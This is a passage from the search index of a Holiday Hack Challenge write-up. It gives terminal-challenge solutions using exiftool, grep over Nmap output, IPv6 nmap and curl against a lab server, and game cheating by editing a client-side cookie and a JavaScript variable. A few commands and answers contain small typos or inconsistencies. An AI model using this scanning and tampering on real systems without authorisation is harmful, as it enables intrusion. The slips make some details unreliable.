Swirl"},{"location":"challenges/T12_Elf_Code_Python/#bonus-level-10-munchkin-dodging-finale","text":"Dodge the munchkins to get to the KringleCon entrance. Use no more than 17 lines of code and 15 object function calls. 1 2 3 4 5 6 7 8 9 10 import elf , munchkins , levers , lollipops , yeeters , pits import time muns = munchkins . get () lols = lollipops . get ()[:: - 1 ] exit = { \"x\" : 2 , \"y\" : 2 } for index , mun in enumerate ( muns ): while ( abs ( elf . position [ \"x\" ] - muns [ index ] . position [ \"x\" ])) < 6 : time . sleep ( 0.05 ) elf . moveTo ( lols [ index ] . position ) elf . moveTo ( exit )","title":"Bonus Level 10 - Munchkin Dodging Finale"},{"location":"challenges/T13_Frostavator/","text":"Frostavator Terminal Challenge Troll Introduction Help Grody Goiterson in the Frost Tower Lobby Hrmph. Snrack! Pthbthbthb. Gnerphk. Well, on to business. I'm Grody Goiterson. ... It's a family name. So hey, this is the Frostavator. It runs on some logic chips... that fell out. I put them back in, but I must have mixed them up, because it isn't working now. If you don't know much about logic gates, it's something you should look up. If you help me run the elevator, maybe I can help you with something else. I'm pretty good with FPGAs, if that's worth something to ya'. Hints and Other Resources Hints from talking with Grody Logic Gate Iconography This Open the Terminal Open the Frostavator panel in the Frost Tower Lobby Screenshot Solution To complete this challenge we have to rearrange the logic gates as shown to provide power to all 3 outputs. Completion Talk to Grody after getting the Frostavator running to receive hints for Objective 13) FPGA Programming Oooo... That's it! A deal's a deal. Let's talk FPGA. First, did you know there are people who do this stuff for fun ? I mean, I'm more into picking on other trolls for fun, but whatever. Also, that Prof. Petabyte guy is giving a talk about FPGAs. Weirdo. So hey, good luck or whatever.","title":"Grody Toiterson - Frostavator"},{"location":"challenges/T13_Frostavator/#frostavator-terminal-challenge","text":"","title":"Frostavator Terminal Challenge"},{"location":"challenges/T13_Frostavator/#troll-introduction","text":"Help Grody Goiterson in the Frost Tower Lobby Hrmph. Snrack! Pthbthbthb. Gnerphk. Well, on to business. I'm Grody Goiterson. ... It's a family name. So hey, this is the Frostavator. It runs on some logic chips... that fell out. I put them back in, but I must have mixed them up, because it isn't working now. If you don't know much about logic gates, it's something you should look up. If you help me run the elevator, maybe I can help you with something else. I'm pretty good with FPGAs, if that's worth something to ya'.","title":"Troll Introduction"},{"location":"challenges/T13_Frostavator/#hints-and-other-resources","text":"Hints from talking with Grody Logic Gate Iconography This","title":"Hints and Other Resources"},{"location":"challenges/T13_Frostavator/#open-the-terminal","text":"Open the Frostavator panel in the Frost Tower Lobby Screenshot","title":"Open the Terminal"},{"location":"challenges/T13_Frostavator/#solution","text":"To complete this challenge we have to rearrange the logic gates as shown to provide power to all 3 outputs.","title":"Solution"},{"location":"challenges/T13_Frostavator/#completion","text":"Talk to Grody after getting the Frostavator running to receive hints for Objective 13) FPGA Programming Oooo... That's it! A deal's a deal. Let's talk FPGA. First, did you know there are people who do this stuff for fun ? I mean, I'm more into picking on other trolls for fun, but whatever. Also, that Prof. Petabyte guy is giving a talk about FPGAs. Weirdo. So hey, good luck or whatever.","title":"Completion"},{"location":"challenges/T2_Document_Analysis/","text":"Document Analysis / Exif Metadata Terminal Challenge Elf Introduction Help Pinny Sappington in the Courtyard Hi ho, Piney Sappington at your service! Well, honestly, I could use a touch of your services. You see, I've been looking at these documents, and I know someone has tampered with one file. Do you think you could log into this Cranberry Pi and take a look? It has exiftool installed on it, if that helps you at all. I just... Well, I have a feeling that someone at that other conference might have fiddled with things. And, if you help me figure this tampering issue out, I\u2019ll give you some hints about OSINT, especially associated with geographic locations! Hints and Other Resources Other Resources ExifTool main page ExifTool command reference Open the Terminal Open the Exif Metadata terminal in the Courtyard Screenshot Solution Logging into the terminal we are told that we must determine the naughty/nice record file that Jack modified just before Christmas. The most obvious way to do this would be to use the ls -l command to give us a list of all files and the date/time that they were last modified. However, in this case we find that does not provide us the information that we are looking for. Screenshot Pinny and the terminal introduction mention that exiftool is installed. While exiftool is most commonly associated with picture and image files, it can read metadata from other file formats, including .docx. To have exiftool display the metadata filename and last modified date for all files, use the command exifdata -T -Filename -ModifyDate * , which tells us the file that was modified on 2021-12-24. Screenshot Answer 2021-12-21.docx Completion Talk to Pinney to receive hints for Objective 2) Where in the World is Caramel Santaigo Wow, you figured that out in no time! Thanks! I knew they were up to no good. So hey, have you tried the Caramel Santaigo game in this courtyard? Carmen? No, I haven't heard of her. So anyway, some of the hints use obscure coordinate systems like MGRS and even what3words . In some cases, you might get an image with location info in the metadata. Good thing you know how to see that stuff now! (And they say, for those who don't like gameplay, there might be a way to bypass by looking at some flavor of cookie...) And Clay Moody is giving a talk on OSINT techniques right now! Oh, and don't forget to learn about your target elf and filter in the Interrink system!","title":"Pinny Sappington - Document Analysis / Exif Metadata"},{"location":"challenges/T2_Document_Analysis/#document-analysis-exif-metadata-terminal-challenge","text":"","title":"Document Analysis / Exif Metadata Terminal Challenge"},{"location":"challenges/T2_Document_Analysis/#elf-introduction","text":"Help Pinny Sappington in the Courtyard Hi ho, Piney Sappington at your service! Well, honestly, I could use a touch of your services. You see, I've been looking at these documents, and I know someone has tampered with one file. Do you think you could log into this Cranberry Pi and take a look? It has exiftool installed on it, if that helps you at all. I just... Well, I have a feeling that someone at that other conference might have fiddled with things. And, if you help me figure this tampering issue out, I\u2019ll give you some hints about OSINT, especially associated with geographic locations!","title":"Elf Introduction"},{"location":"challenges/T2_Document_Analysis/#hints-and-other-resources","text":"Other Resources ExifTool main page ExifTool command reference","title":"Hints and Other Resources"},{"location":"challenges/T2_Document_Analysis/#open-the-terminal","text":"Open the Exif Metadata terminal in the Courtyard Screenshot","title":"Open the Terminal"},{"location":"challenges/T2_Document_Analysis/#solution","text":"Logging into the terminal we are told that we must determine the naughty/nice record file that Jack modified just before Christmas. The most obvious way to do this would be to use the ls -l command to give us a list of all files and the date/time that they were last modified. However, in this case we find that does not provide us the information that we are looking for. Screenshot Pinny and the terminal introduction mention that exiftool is installed. While exiftool is most commonly associated with picture and image files, it can read metadata from other file formats, including .docx. To have exiftool display the metadata filename and last modified date for all files, use the command exifdata -T -Filename -ModifyDate * , which tells us the file that was modified on 2021-12-24. Screenshot Answer 2021-12-21.docx","title":"Solution"},{"location":"challenges/T2_Document_Analysis/#completion","text":"Talk to Pinney to receive hints for Objective 2) Where in the World is Caramel Santaigo Wow, you figured that out in no time! Thanks! I knew they were up to no good. So hey, have you tried the Caramel Santaigo game in this courtyard? Carmen? No, I haven't heard of her. So anyway, some of the hints use obscure coordinate systems like MGRS and even what3words . In some cases, you might get an image with location info in the metadata. Good thing you know how to see that stuff now! (And they say, for those who don't like gameplay, there might be a way to bypass by looking at some flavor of cookie...) And Clay Moody is giving a talk on OSINT techniques right now! Oh, and don't forget to learn about your target elf and filter in the Interrink system!","title":"Completion"},{"location":"challenges/T3_Grepping_for_Gold/","text":"Grepping for Gold Terminal Challenge Troll Introduction Help Greasy GopherGuts in front of the Frost Tower Grnph. Blach! Phlegm. I'm Greasy Gopherguts. I need help with parsing some Nmap output. If you help me find some results, I'll give you some hints about Wi-Fi. Click on the terminal next to me and read the instructions. Maybe search for a cheat sheet if the hints in the terminal don't do it for ya'. You\u2019ll type quizme in the terminal and grep through the Nmap bigscan.gnmap file to find answers. Hints and Other Resources Hints from talking with Greasy Grep Cheat Sheet Check this out if you need a grep refresher. Other Resources Nmap Options Summary https://nmap.org/book/man-briefoptions.html Regular Expression Tester https://regex101.com/ Open the Terminal Open the Grepping for Gold terminal in front of Frost Tower Screenshot Solution Question 1: What port does 34.76.1.22 have open? nmap output includes the ports that a particular host has open, so we just need to issue a grep command with the IP address as the pattern and see what is in the output. grep 34.76.1.22 bigscan.gnmap Screenshot What port does 34.76.1.22 have open? 62078 Question 2: What port does 34.77.207.226 have open? Use the same command from the previous question with a different IP address grep 34.77.207.226 bigscan.gnmap Screenshot What port does 34.77.207.226 have open? 8080 Question 3: How many hosts appear \"Up\" in the scan? Nmap scans identify a host that is 'Up' with the 'Status: Up' value, so we need to count how many times that pattern appears in the scan. This can be done in several ways. Option 1 Option 2 Option 3 Use the native grep command option -c to return a count of how many times the pattern appears in the log grep -c 'Status: Up' bigscan.gnmap Screenshot Using grep, return all the lines with the pattern and then pipe that into wc (word count) with the -l switch which will return the number of lines. grep 'Status: Up' bigscan.gnmap | wc -l Screenshot Don't bother with grep at all. Rather, output the last line of the nmap file which helpfully provides a summary of how many IPs were scanned and how many were found to be up. tail -l bigscan.gnmap Screenshot How many hosts appear 'Up' in the scan? 26054 Question 4: How many hosts have a web port open? (TCP 80, 443, and 8080) From the output of the last two commands we see that if nmap finds a port to be open it is included in the output as <portnumber>/open/<protocol>/<service name> . If more than one port is open then nmap will output all ports on a single line. To search for lines containing more than one possible pattern we can use the -E switch to specify the pattern as an extended regular expression, using each of the possible matching patterns with the OR operator. Option 1 Option 2 grep -c -E '80/open/tcp|8080/open/tcp|443/open/tcp' bigscan.gnmap Screenshot grep -E '(80|443|8080)/open/tcp' bigscan.gnmap | wc -l Screenshot How many hosts have a web port open? (TCP 80, 443, and 8080) 14372 Question 5: How many hosts with a status \"Up\" have no (dedicated) open TCP ports? If a host is up but has no ports open, then it will be in the output with no 'Ports' line. Screenshot From a previous command we know that there are 26054 hosts that are up, so we just need to subtract from that the number that have open ports. grep -c 'Ports:' bigscan.gnmap Screenshot 25652 hosts have open ports so the number that do not is 26054 - 25652 = 402 How many hosts with status Up have no (dedicated) open TCP ports? 402 Question 6: What's the greatest number of TCP ports any one host has open? A host with multiple TCP ports open will have the pattern 'open/tcp' repeated in the output for each open port. Using the regular expression qualifier {#} we can specify that we want to match a pattern exactly # times. So using this command with a variety of values for # we can zero in on the largest value that returns results. grep -c -E '(open/tcp.*){#}' bigscan.gnmap Screenshot What's the greatest number of TCP ports any one host has open? 12 Completion Talk to Greasy to receive hints for Objective 3) Thaw Frost Tower's Entrance Grack. Ungh. ... Oh! You really did it? Well, OK then. Here's what I know about the wifi here. Scanning for Wi-Fi networks with iwlist will be location-dependent. You may need to move around the North Pole and keep scanning to identify a Wi-Fi network. Wireless in Linux is supported by many tools, but iwlist and iwconfig are commonly used at the command line. The curl utility can make HTTP requests at the command line! By default, curl makes an HTTP GET request. You can add --request POST as a command line argument to make an HTTP POST request. When sending HTTP POST, add --data-binary followed by the data you want to send as the POST body.","title":"Greasy Gopherkins - Grepping for Gold"},{"location":"challenges/T3_Grepping_for_Gold/#grepping-for-gold-terminal-challenge","text":"","title":"Grepping for Gold Terminal Challenge"},{"location":"challenges/T3_Grepping_for_Gold/#troll-introduction","text":"Help Greasy GopherGuts in front of the Frost Tower Grnph. Blach! Phlegm. I'm Greasy Gopherguts. I need help with parsing some Nmap output. If you help me find some results, I'll give you some hints about Wi-Fi. Click on the terminal next to me and read the instructions. Maybe search for a cheat sheet if the hints in the terminal don't do it for ya'. You\u2019ll type quizme in the terminal and grep through the Nmap bigscan.gnmap file to find answers.","title":"Troll Introduction"},{"location":"challenges/T3_Grepping_for_Gold/#hints-and-other-resources","text":"Hints from talking with Greasy Grep Cheat Sheet Check this out if you need a grep refresher. Other Resources Nmap Options Summary https://nmap.org/book/man-briefoptions.html Regular Expression Tester https://regex101.com/","title":"Hints and Other Resources"},{"location":"challenges/T3_Grepping_for_Gold/#open-the-terminal","text":"Open the Grepping for Gold terminal in front of Frost Tower Screenshot","title":"Open the Terminal"},{"location":"challenges/T3_Grepping_for_Gold/#solution","text":"","title":"Solution"},{"location":"challenges/T3_Grepping_for_Gold/#question-1-what-port-does-3476122-have-open","text":"nmap output includes the ports that a particular host has open, so we just need to issue a grep command with the IP address as the pattern and see what is in the output. grep 34.76.1.22 bigscan.gnmap Screenshot What port does 34.76.1.22 have open? 62078","title":"Question 1: What port does 34.76.1.22 have open?"},{"location":"challenges/T3_Grepping_for_Gold/#question-2-what-port-does-3477207226-have-open","text":"Use the same command from the previous question with a different IP address grep 34.77.207.226 bigscan.gnmap Screenshot What port does 34.77.207.226 have open? 8080","title":"Question 2: What port does 34.77.207.226 have open?"},{"location":"challenges/T3_Grepping_for_Gold/#question-3-how-many-hosts-appear-up-in-the-scan","text":"Nmap scans identify a host that is 'Up' with the 'Status: Up' value, so we need to count how many times that pattern appears in the scan. This can be done in several ways. Option 1 Option 2 Option 3 Use the native grep command option -c to return a count of how many times the pattern appears in the log grep -c 'Status: Up' bigscan.gnmap Screenshot Using grep, return all the lines with the pattern and then pipe that into wc (word count) with the -l switch which will return the number of lines. grep 'Status: Up' bigscan.gnmap | wc -l Screenshot Don't bother with grep at all. Rather, output the last line of the nmap file which helpfully provides a summary of how many IPs were scanned and how many were found to be up. tail -l bigscan.gnmap Screenshot How many hosts appear 'Up' in the scan? 26054","title":"Question 3: How many hosts appear \"Up\" in the scan?"},{"location":"challenges/T3_Grepping_for_Gold/#question-4-how-many-hosts-have-a-web-port-open-tcp-80-443-and-8080","text":"From the output of the last two commands we see that if nmap finds a port to be open it is included in the output as <portnumber>/open/<protocol>/<service name> . If more than one port is open then nmap will output all ports on a single line. To search for lines containing more than one possible pattern we can use the -E switch to specify the pattern as an extended regular expression, using each of the possible matching patterns with the OR operator. Option 1 Option 2 grep -c -E '80/open/tcp|8080/open/tcp|443/open/tcp' bigscan.gnmap Screenshot grep -E '(80|443|8080)/open/tcp' bigscan.gnmap | wc -l Screenshot How many hosts have a web port open? (TCP 80, 443, and 8080) 14372","title":"Question 4: How many hosts have a web port open? (TCP 80, 443, and 8080)"},{"location":"challenges/T3_Grepping_for_Gold/#question-5-how-many-hosts-with-a-status-up-have-no-dedicated-open-tcp-ports","text":"If a host is up but has no ports open, then it will be in the output with no 'Ports' line. Screenshot From a previous command we know that there are 26054 hosts that are up, so we just need to subtract from that the number that have open ports. grep -c 'Ports:' bigscan.gnmap Screenshot 25652 hosts have open ports so the number that do not is 26054 - 25652 = 402 How many hosts with status Up have no (dedicated) open TCP ports? 402","title":"Question 5: How many hosts with a status \"Up\" have no (dedicated) open TCP ports?"},{"location":"challenges/T3_Grepping_for_Gold/#question-6-whats-the-greatest-number-of-tcp-ports-any-one-host-has-open","text":"A host with multiple TCP ports open will have the pattern 'open/tcp' repeated in the output for each open port. Using the regular expression qualifier {#} we can specify that we want to match a pattern exactly # times. So using this command with a variety of values for # we can zero in on the largest value that returns results. grep -c -E '(open/tcp.*){#}' bigscan.gnmap Screenshot What's the greatest number of TCP ports any one host has open? 12","title":"Question 6: What's the greatest number of TCP ports any one host has open?"},{"location":"challenges/T3_Grepping_for_Gold/#completion","text":"Talk to Greasy to receive hints for Objective 3) Thaw Frost Tower's Entrance Grack. Ungh. ... Oh! You really did it? Well, OK then. Here's what I know about the wifi here. Scanning for Wi-Fi networks with iwlist will be location-dependent. You may need to move around the North Pole and keep scanning to identify a Wi-Fi network. Wireless in Linux is supported by many tools, but iwlist and iwconfig are commonly used at the command line. The curl utility can make HTTP requests at the command line! By default, curl makes an HTTP GET request. You can add --request POST as a command line argument to make an HTTP POST request. When sending HTTP POST, add --data-binary followed by the data you want to send as the POST body.","title":"Completion"},{"location":"challenges/T4_Logic_Munchers/","text":"Logic Munchers Terminal Challenge Elf Introduction Help Noel Boetie in front of Santa's Castle Hello there! Noel Boetie here. We\u2019re all so glad to have you attend KringleCon IV and work on the Holiday Hack Challenge! I'm just hanging out here by the Logic Munchers game. You know\u2026 logic: that thing that seems to be in short supply at the tower on the other side of the North Pole? Oh, I'm sorry. That wasn't terribly kind, but those frosty souls do confuse me... Anyway, I\u2019m working my way through this Logic Munchers game. A lot of it comes down to understanding boolean logic, like True And False is False , but True And True is True . It can get a tad complex in the later levels. I need some help, though. If you can show me how to complete a stage in Potpourri at the Intermediate (Stage 3) or higher, I\u2019ll give you some hints for how to find vulnerabilities. Specifically, I\u2019ll give you some tips in finding flaws in some of the web applications I\u2019ve heard about here at the North Pole, especially those associated with slot machines! Hints and Other Resources Hints from talking with Noel Boolean Logic There are lots of special symbols for logic and set notation. This one covers AND, NOT, and OR at the bottom. AND, OR, NOT, XOR This might be a handy reference too. Open the Terminal Open the Logic Munchers terminal in front of Santa's Castle Screenshot Solution While I expect there are ways to hack the game in order to win, I found solving the semi-complex logic puzzles equally challenging and in my opinion relevant to the 'hacker' mindset, so my solution to this challenge was to simply play the game as intended. But there is an important strategy to use, especially at the higher levels, which is to pause the game periodically with the Esc key in order to give yourself time to solve several of the nearby squares. Then unpause, clear as many as you can, and repeat without getting eaten by a Trollog until there are no true values left. And remember that as a Trollog passes over a square the logic puzzle under it will change. It is also helpful to take note of the hints provided at the various levels, which are compiled in this table in the Extras section. Completion Talk to Noel after completing an Intermediate - Potpourri level to receive hints for Objective 4) Slot Machine Investigation Wow - amazing score! Great work! So hey, those slot machines. It seems that in his haste, Jack bought some terrible hardware. It seems they're susceptible to parameter tampering . You can modify web request parameters with an intercepting proxy or tools built into Firefox.","title":"Noel Boetie - Logic Munchers"},{"location":"challenges/T4_Logic_Munchers/#logic-munchers-terminal-challenge","text":"","title":"Logic Munchers Terminal Challenge"},{"location":"challenges/T4_Logic_Munchers/#elf-introduction","text":"Help Noel Boetie in front of Santa's Castle Hello there! Noel Boetie here. We\u2019re all so glad to have you attend KringleCon IV and work on the Holiday Hack Challenge! I'm just hanging out here by the Logic Munchers game. You know\u2026 logic: that thing that seems to be in short supply at the tower on the other side of the North Pole? Oh, I'm sorry. That wasn't terribly kind, but those frosty souls do confuse me... Anyway, I\u2019m working my way through this Logic Munchers game. A lot of it comes down to understanding boolean logic, like True And False is False , but True And True is True . It can get a tad complex in the later levels. I need some help, though. If you can show me how to complete a stage in Potpourri at the Intermediate (Stage 3) or higher, I\u2019ll give you some hints for how to find vulnerabilities. Specifically, I\u2019ll give you some tips in finding flaws in some of the web applications I\u2019ve heard about here at the North Pole, especially those associated with slot machines!","title":"Elf Introduction"},{"location":"challenges/T4_Logic_Munchers/#hints-and-other-resources","text":"Hints from talking with Noel Boolean Logic There are lots of special symbols for logic and set notation. This one covers AND, NOT, and OR at the bottom. AND, OR, NOT, XOR This might be a handy reference too.","title":"Hints and Other Resources"},{"location":"challenges/T4_Logic_Munchers/#open-the-terminal","text":"Open the Logic Munchers terminal in front of Santa's Castle Screenshot","title":"Open the Terminal"},{"location":"challenges/T4_Logic_Munchers/#solution","text":"While I expect there are ways to hack the game in order to win, I found solving the semi-complex logic puzzles equally challenging and in my opinion relevant to the 'hacker' mindset, so my solution to this challenge was to simply play the game as intended. But there is an important strategy to use, especially at the higher levels, which is to pause the game periodically with the Esc key in order to give yourself time to solve several of the nearby squares. Then unpause, clear as many as you can, and repeat without getting eaten by a Trollog until there are no true values left. And remember that as a Trollog passes over a square the logic puzzle under it will change. It is also helpful to take note of the hints provided at the various levels, which are compiled in this table in the Extras section.","title":"Solution"},{"location":"challenges/T4_Logic_Munchers/#completion","text":"Talk to Noel after completing an Intermediate - Potpourri level to receive hints for Objective 4) Slot Machine Investigation Wow - amazing score! Great work! So hey, those slot machines. It seems that in his haste, Jack bought some terrible hardware. It seems they're susceptible to parameter tampering . You can modify web request parameters with an intercepting proxy or tools built into Firefox.","title":"Completion"},{"location":"challenges/T5_IPv6_Sandbox/","text":"IPv6 Sandbox Terminal Challenge Elf Introduction Help Jewel Loggins in KringleCon Talks Lobby Well hello! I'm Jewel Loggins. I have to say though, I'm a bit distressed. The con next door? Oh sure, I\u2019m concerned about that too, but I was talking about the issues I\u2019m having with IPv6. I mean, I know it's an old protocol now, but I've just never checked it out. So now I'm trying to do simple things like Nmap and cURL using IPv6, and I can't quite get them working! Would you mind taking a look for me on this terminal? I think there's a Github Gist that covers tool usage with IPv6 targets. The tricky parts are knowing when to use [] around IPv6 addresses and where to specify the source interface. I\u2019ve got a deal for you. If you show me how to solve this terminal, I\u2019ll provide you with some nice tips about a topic I\u2019ve been researching a lot lately \u2013 Ducky Scripts! They can be really interesting and fun! Hints and Other Resources Hints from talking with Jewel IPv6 Reference Check out this Github Gist with common tools used in an IPv6 context. Other Resources IPv6 Address format https://en.wikipedia.org/wiki/IPv6_address Terminal Introduction Open the IPv6 Sandbox terminal in the KringleCon Talk Lobby Screenshot Solution For this challenge we need to find another machine in the network that we can get the Candy Striper password from. Using the command ifconfig we learn that our IP address is 192.168.160.3, so let's start with a simple scan of our local class C network with nmap to see what is there. nmap -sn 192.168.160.1/24 Screenshot From this we see that there is a server named ipv6-server.ipv6guest.kringlecastle.com with the IPv4 address 192.168.160.2. Let's see what ports are open on it. map -sT 192.168.160.2 Screenshot Port 80 is open, so let's see what we get when we connect. curl 192.168.160.2 Screenshot Unsurprisingly, given the description of this challenge, there is nothing interesting on the IPv4 port. So, let's see what IPv6 ports are open. nmap -6 -sT ipv6-server.ipv6guest.kringlecastle.com Screenshot Now we see two ports, 80 and 9000 are open. Using cURL with both of these ports we find the answer we are looking for on port 9000. curl http://[2604:6000:1528:cd:d55a:f8a7:d30a:e405]:80 curl http://[2604:6000:1528:cd:d55a:f8a7:d30a:e405]:9000 Screenshot Answer PieceOnEarth Completion Talk to Jewel to receive hints for Objective 5) Strange USB Device Great work! It seems simpler now that I've seen it once. Thanks for showing me! Prof. Petabyte warned us about random USB devices. They might be malicious keystroke injectors! A troll could program a keystroke injector to deliver malicious keystrokes when it is plugged in. Ducky Script is a language used to specify those keystrokes. What commands would a troll try to run on our workstations? I heard that SSH keys can be used as backdoors . Maybe that's useful?","title":"Jewel Loggins - IPv6 Sandbox"},{"location":"challenges/T5_IPv6_Sandbox/#ipv6-sandbox-terminal-challenge","text":"","title":"IPv6 Sandbox Terminal Challenge"},{"location":"challenges/T5_IPv6_Sandbox/#elf-introduction","text":"Help Jewel Loggins in KringleCon Talks Lobby Well hello! I'm Jewel Loggins. I have to say though, I'm a bit distressed. The con next door? Oh sure, I\u2019m concerned about that too, but I was talking about the issues I\u2019m having with IPv6. I mean, I know it's an old protocol now, but I've just never checked it out. So now I'm trying to do simple things like Nmap and cURL using IPv6, and I can't quite get them working! Would you mind taking a look for me on this terminal? I think there's a Github Gist that covers tool usage with IPv6 targets. The tricky parts are knowing when to use [] around IPv6 addresses and where to specify the source interface. I\u2019ve got a deal for you. If you show me how to solve this terminal, I\u2019ll provide you with some nice tips about a topic I\u2019ve been researching a lot lately \u2013 Ducky Scripts! They can be really interesting and fun!","title":"Elf Introduction"},{"location":"challenges/T5_IPv6_Sandbox/#hints-and-other-resources","text":"Hints from talking with Jewel IPv6 Reference Check out this Github Gist with common tools used in an IPv6 context. Other Resources IPv6 Address format https://en.wikipedia.org/wiki/IPv6_address","title":"Hints and Other Resources"},{"location":"challenges/T5_IPv6_Sandbox/#terminal-introduction","text":"Open the IPv6 Sandbox terminal in the KringleCon Talk Lobby Screenshot","title":"Terminal Introduction"},{"location":"challenges/T5_IPv6_Sandbox/#solution","text":"For this challenge we need to find another machine in the network that we can get the Candy Striper password from. Using the command ifconfig we learn that our IP address is 192.168.160.3, so let's start with a simple scan of our local class C network with nmap to see what is there. nmap -sn 192.168.160.1/24 Screenshot From this we see that there is a server named ipv6-server.ipv6guest.kringlecastle.com with the IPv4 address 192.168.160.2. Let's see what ports are open on it. map -sT 192.168.160.2 Screenshot Port 80 is open, so let's see what we get when we connect. curl 192.168.160.2 Screenshot Unsurprisingly, given the description of this challenge, there is nothing interesting on the IPv4 port. So, let's see what IPv6 ports are open. nmap -6 -sT ipv6-server.ipv6guest.kringlecastle.com Screenshot Now we see two ports, 80 and 9000 are open. Using cURL with both of these ports we find the answer we are looking for on port 9000. curl http://[2604:6000:1528:cd:d55a:f8a7:d30a:e405]:80 curl http://[2604:6000:1528:cd:d55a:f8a7:d30a:e405]:9000 Screenshot Answer PieceOnEarth","title":"Solution"},{"location":"challenges/T5_IPv6_Sandbox/#completion","text":"Talk to Jewel to receive hints for Objective 5) Strange USB Device Great work! It seems simpler now that I've seen it once. Thanks for showing me! Prof. Petabyte warned us about random USB devices. They might be malicious keystroke injectors! A troll could program a keystroke injector to deliver malicious keystrokes when it is plugged in. Ducky Script is a language used to specify those keystrokes. What commands would a troll try to run on our workstations? I heard that SSH keys can be used as backdoors . Maybe that's useful?","title":"Completion"},{"location":"challenges/T6_Holiday_Hero/","text":"Holiday Hero Terminal Challenge Elf Introduction Help Chimney Scissorsticks in the KringleCon Netwars area Woo! I'm Chimney Scissorsticks, and I'm having a great time up here! I've been hanging out with all these NetWars players and not worrying about what's going on next door. In fact, I've really been having fun playing with this Holiday Hero terminal. You can use it to generate some jamming holiday tunes that help power Santa\u2019s sleigh! It's more fun to play with a friend but I've also heard there's a clever way to enable single player mode. Single player mode? I heard it can be enabled by fiddling with two client-side values, one of which is passed to the server. It's so much more fun and easier with a friend though! Either way, we'd really appreciate your help getting the sleigh all fueled up. Then I can get back to thinking about shellcode.. Hints and Other Resources Other Resources Chrome Developer Tools https://developer.chrome.com/docs/devtools/ Open the Terminal Click on Santa's Sleigh on the roof of Santa's Castle to start the game. Screenshot Solution The game can be won by playing it with another player, but where is the sense of accomplishment in that? So this solution will describe how to force the game to run in single player mode so you don't have to share the glory with anyone else. Note that these instructions are written for the Chrome web browser. Other browsers may have slightly different steps but the basics will be the same. Also note that if you are using a privacy enhancing browser such as Brave, some things might not work exactly as expected (such as the client-side cookie not being saved). Single Player Mode step 1 - Modify the client-side cookie Open the browser Development Tools ( Ctrl + Shift + I , or from 'Menu > More tools > Developer tools') and start a game by selecting 'Create Room' While at the Welcome screen, open the Network panel in Developer Tools and filter on the type Doc. There will be an entry for a URL containing the ID of the game just started. Highlight it and view the 'Cookies' tab on the left. Here we will find that the HOHOHO cookie has the value single_player set to false. Screenshot To modify this cookie open the Application panel, then drill down into 'Storage > Cookies > https://hero.kringlecastle.com' and edit the value to be true. Screenshot Note that this cookie is stored client side, so unless you clear cookies you shouldn't have to do this again if you start another game. Single Player Mode step 2 - Modify the JavaScript variable The second value we need to change is in the JavaScript. To find it open the Sources panel, then drill down into ' > hero.kringlecastle.com > assets/js > holidayhero.min.js'. The file is minified so select the option to 'Pretty-print' the file so we can read it. Viewing the code we see on line 22 that there is a variable named single_player_mode. Screenshot To set this variable for the running session (this code is retrieved from the server every time the page is loaded), go to the Console panel, set the JavaScript context to the ID of the game, then set single_player_mode = true As soon as we do we will get the message that 'Player 2 (COMPUTER) has joined!' Screenshot Now we can start the game and the computer will play flawlessly as your partner. Screenshot Completion Talk to Chimney after winning the game to receive hints for Objective 6) Shellcode Primer You did it - rock on! We're all set now that the sleigh is fueled! So hey, let me talk to you a bit about manual exploitation. If you run into any shellcode primers at the North Pole, be sure to read the directions and the comments in the shellcode source! Also, troubleshooting shellcode can be difficult. Use the debugger step-by-step feature to watch values. Lastly, be careful not to overwrite any register values you need to reference later on in your shellcode. That's it! I know you can do it!","title":"Chimney Scissorsticks - Holiday Hero"},{"location":"challenges/T6_Holiday_Hero/#holiday-hero-terminal-challenge","text":"","title":"Holiday Hero Terminal Challenge"},{"location":"challenges/T6_Holiday_Hero/#elf-introduction","text":"Help Chimney Scissorsticks in the KringleCon Netwars area Woo! I'm Chimney Scissorsticks, and I'm having a great time up here! I've been hanging out with all these NetWars players and not worrying about what's going on next door. In fact, I've really been having fun playing with this Holiday Hero terminal. You can use it to generate some jamming holiday tunes that help power Santa\u2019s sleigh! It's more fun to play with a friend but I've also heard there's a clever way to enable single player mode. Single player mode? I heard it can be enabled by fiddling with two client-side values, one of which is passed to the server. It's so much more fun and easier with a friend though! Either way, we'd really appreciate your help getting the sleigh all fueled up. Then I can get back to thinking about shellcode..","title":"Elf Introduction"},{"location":"challenges/T6_Holiday_Hero/#hints-and-other-resources","text":"Other Resources Chrome Developer Tools https://developer.chrome.com/docs/devtools/","title":"Hints and Other Resources"},{"location":"challenges/T6_Holiday_Hero/#open-the-terminal","text":"Click on Santa's Sleigh on the roof of Santa's Castle to start the game. Screenshot","title":"Open the Terminal"},{"location":"challenges/T6_Holiday_Hero/#solution","text":"The game can be won by playing it with another player, but where is the sense of accomplishment in that? So this solution will describe how to force the game to run in single player mode so you don't have to share the glory with anyone else. Note that these instructions are written for the Chrome web browser. Other browsers may have slightly different steps but the basics will be the same. Also note that if you are using a privacy enhancing browser such as Brave, some things might not work exactly as expected (such as the client-side cookie not being saved).","title":"Solution"},{"location":"challenges/T6_Holiday_Hero/#single-player-mode-step-1-modify-the-client-side-cookie","text":"Open the browser Development Tools ( Ctrl + Shift + I , or from 'Menu > More tools > Developer tools') and start a game by selecting 'Create Room' While at the Welcome screen, open the Network panel in Developer Tools and filter on the type Doc. There will be an entry for a URL containing the ID of the game just started. Highlight it and view the 'Cookies' tab on the left. Here we will find that the HOHOHO cookie has the value single_player set to false. Screenshot To modify this cookie open the Application panel, then drill down into 'Storage > Cookies > https://hero.kringlecastle.com' and edit the value to be true. Screenshot Note that this cookie is stored client side, so unless you clear cookies you shouldn't have to do this again if you start another game.","title":"Single Player Mode step 1 - Modify the client-side cookie"},{"location":"challenges/T6_Holiday_Hero/#single-player-mode-step-2-modify-the-javascript-variable","text":"The second value we need to change is in the JavaScript. To find it open the Sources panel, then drill down into ' > hero.kringlecastle.com > assets/js > holidayhero.min.js'. The file is minified so select the option to 'Pretty-print' the file so we can read it. Viewing the code we see on line 22 that there is a variable named single_player_mode. Screenshot To set this variable for the running session (this code is retrieved from the server every time the page is loaded), go to the Console panel, set the JavaScript context to the ID of the game, then set single_player_mode = true As soon as we do we will get the message that 'Player 2 (COMPUTER) has joined!' Screenshot Now we can start the game and the computer will play flawlessly as your partner. Screenshot","title":"Single Player Mode step 2 - Modify the JavaScript variable"},{"location":"challenges/T6_Holiday_Hero/#completion","text":"Talk to Chimney after winning the game to receive hints for Objective 6) Shellcode Primer You did it - rock on! We're all set now that the sleigh is fueled! So hey, let me talk to you a bit about manual exploitation. If you run into any shellcode primers at the North Pole, be sure to read the directions and the comments in the shellcode source! Also, 